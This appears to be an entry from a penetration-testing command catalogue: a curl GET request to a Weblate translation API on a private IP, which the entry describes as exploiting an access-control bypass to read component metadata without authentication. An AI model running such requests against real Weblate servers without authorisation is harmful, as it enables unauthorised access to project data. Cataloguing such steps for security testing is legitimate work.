---
id: f6g7h8i9-j0k1-2345-fghi-678901234567
data: >-
  curl -X GET
  "http://192.168.1.129:8000/api/components/testproject/testcomponent/translations/"
tags:
  - api
  - get-request
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:32:01.899Z'
verified: false
validated: true
submitted: true
---
# curl-api-get

## Command

```bash
curl -X GET "http://192.168.1.129:8000/api/components/testproject/testcomponent/translations/"
```

## Description

This command performs an unauthenticated GET request to the Weblate API to retrieve translation details for a specific component, exploiting the access control bypass to obtain JSON metadata.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies the HTTP method | Yes |
| URL | Target API endpoint | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "http://192.168.1.129:8000/api/components/testproject/testcomponent/translations/"
```

### Advanced Usage

```bash
curl -X GET "http://192.168.1.129:8000/api/components/testproject/testcomponent/translations/?format=json"
```

## Expected Output

JSON array with translation objects, including urls, names, and file_url fields, e.g., {"count":1,"next":null,"previous":null,"results":[{"url":"...","file_url":"..."}]}.

## Related

- [[commands/curl-file-download]]
